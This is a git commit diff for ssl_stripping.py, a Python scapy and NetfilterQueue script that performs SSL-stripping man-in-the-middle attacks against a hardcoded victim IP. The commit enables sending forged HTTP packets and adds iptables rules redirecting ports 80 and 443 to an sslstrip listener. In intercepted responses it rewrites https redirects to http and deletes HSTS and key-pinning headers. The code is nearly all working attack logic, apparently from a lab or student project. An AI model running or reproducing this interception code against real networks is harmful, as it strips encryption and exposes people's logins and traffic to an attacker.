2b5125c86d71c4d4408a1e07f80cda3d2d599d08
Djagur <64599344+Djagur@users.noreply.github.com>
2024-06-13 23:14:52 +0200

    Update ssl_stripping.py

--- ssl_stripping.py
+++ ssl_stripping.py
@@ -1,25 +1,22 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-from scapy.layers import http
 from scapy.layers.http import *
 import scapy
-from scapy import *
-from scapy.all import *
-#from scapy.layers.ssl_tls import *
+
 import os
 import threading
 import cryptography    #required for tls
 
-#load_layer("tls")    #enables tls for the https connection with the server
-#load_layer("http")    #also useful
+load_layer("tls")    #enables tls for the https connection with the server
 
 class SslRemover():
 
-    def __init__(self, ip_victim, queue_num):
+    def __init__(self, queue_num):
 
         self.queue         = NetfilterQueue()
+        print queue_num
         self.iprule_add    = "iptables -A FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
-        self.iprule2_add    = "iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
+        self.iprule2_add    = "iptables -t nat -A PREROUTING -p tcp --destination-port 8 -j REDIRECT --to-port 80"
         self.iprule_remove = "iptables -D FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
         self.iprule2_remove = "iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
         self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
@@ -36,16 +33,20 @@ class SslRemover():
         #greeting = TLSClientHello(ciphers=<int code of the cipher suite>)
         connection = TLSClientAutomaton(dport=50000, client_hello=ch)
         connection.run()
-
+    
     def handle_packet(self, packet_nfqueue):
         packet_scapy = IP(packet_nfqueue.get_payload())
+        #print packet_scapy.show()
+        
         #if not packet_scapy.haslayer(Raw):
         #    return packet_nfqueue.accept()
         #print "\n"
+        
         #print packet_scapy.show()
         #print "\n"
         #if packet_scapy.haslayer(Raw):
             #payload = packet_scapy[Raw].load
+            #print payload
             #if 'https' in payload:
             #    payload = payload.replace('https', 'http')
             #    packet_scapy[Raw].load = payload
@@ -56,10 +57,24 @@ class SslRemover():
             #    del packet_scapy[TCP].chksum
             #    packet_nfqueue.set_payload(bytes(packet_scapy))
             #return packet_nfqueue.accept()
+        '''
+        if not packet_scapy.haslayer(Raw):
+            return packet_nfqueue.accept()
 
+        else:
+            payload = packet_scapy[Raw].load
+            print payload
+            if payload[0]==0x17 and payload[1]==0x03 and payload[176]==0x00 and payload[177]==0x35:
+                print "Haha"
+                return packet_nfqueue.drop()
+        
+        return packet_nfqueue.accept()
+        '''
+        
         if packet_scapy.haslayer(HTTPResponse):
             print packet_scapy.show()
-            packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://")
+            if not packet_scapy[HTTPResponse].Location==None:
+                packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://")
             print packet_scapy[HTTPResponse].Location
             del packet_scapy[HTTPResponse].Strict_Transport_Security
             del packet_scapy[HTTPResponse].Public_Key_Pins
@@ -90,7 +105,7 @@ class SslRemover():
                              Accept_Encoding=http_layer.Accept_Encoding,
                              Connection=b'close'
                          )
-            #send(new_packet)
+            send(new_packet)
             print "Request packet made"
 
              # Create a fake HTTP response
@@ -103,30 +118,38 @@ class SslRemover():
                               )
     
             # Send the fake response
-            #send(response_packet)
+            send(response_packet)
             print "Response packet made"
 
         return packet_nfqueue.accept()
+        
 
     def start(self):
 
         os.system(self.iprule_add)    #make sure SSL ssling
-        os.system(self.iprule2_add)    #make sure SSL ssling
+        #os.system(self.iprule2_add)    #make sure SSL ssling
+        
         self.thread.start()    #queue starts accepting packages
+        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+        os.system("sslstrip -l 8080")
 
         print "SSL stripping started"
 
     def stop(self):
 
         os.system(self.iprule_remove)    #make sure SSL nbot ssling
-        os.system(self.iprule2_remove)    #make sure SSL nbot ssling
+        #os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        #os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+        #os.system(self.iprule2_remove)    #make sure SSL nbot ssling
+        #os.system("sslstrip -k"
         self.queue.unbind()    #delete queue
 
         print "SSL stripping stopped"
 
 if __name__ == "__main__":
     ip_victim = "10.0.123.5"
-    ssl_remover = SslRemover(ip_victim, 2)
+    ssl_remover = SslRemover(2)
     ssl_remover.start()
     time.sleep(20)
     ssl_remover.stop()
